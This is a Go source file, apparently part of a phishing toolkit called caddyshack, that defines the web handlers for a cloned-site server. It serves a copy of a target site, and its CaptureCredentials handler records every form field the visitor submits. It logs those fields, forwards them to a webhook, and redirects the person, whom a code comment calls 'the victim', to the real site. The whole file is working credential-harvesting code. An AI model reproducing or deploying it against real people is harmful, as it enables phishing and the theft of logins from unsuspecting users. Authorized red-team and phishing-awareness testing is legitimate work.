package server

import (
	"context"
	"net/http"
	"path/filepath"
	"strings"

	"github.com/BLTSEC/caddyshack/internal/logger"
	"github.com/BLTSEC/caddyshack/internal/webhook"
)

type handlers struct {
	cloneDir    string
	log         *logger.Logger
	redirectURL string
	notifier    *webhook.Notifier
}

// ServeClone serves the cloned site. Requests for /assets/* are served from
// the assets subdirectory; everything else falls back to index.html.
func (h *handlers) ServeClone(w http.ResponseWriter, r *http.Request) {
	if strings.HasPrefix(r.URL.Path, "/assets/") {
		// Only allow a single filename component — no slashes, no dots prefix.
		filename := filepath.Base(r.URL.Path)
		if filename == "." || filename == "/" || strings.HasPrefix(filename, ".") {
			http.Error(w, "forbidden", http.StatusForbidden)
			return
		}
		http.ServeFile(w, r, filepath.Join(h.cloneDir, "assets", filename))
		return
	}
	http.ServeFile(w, r, filepath.Join(h.cloneDir, "index.html"))
}

// CaptureCredentials handles POST /submit — records fields, fires webhook,
// then redirects the victim to the real site.
func (h *handlers) CaptureCredentials(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost && r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := r.ParseForm(); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	fields := make(map[string]string, len(r.Form))
	for k, v := range r.Form {
		fields[k] = strings.Join(v, ", ")
	}

	h.log.LogCapture(r, fields)

	if h.notifier != nil {
		go h.notifier.Send(context.Background(), fields)
	}

	http.Redirect(w, r, h.redirectURL, http.StatusFound)
}
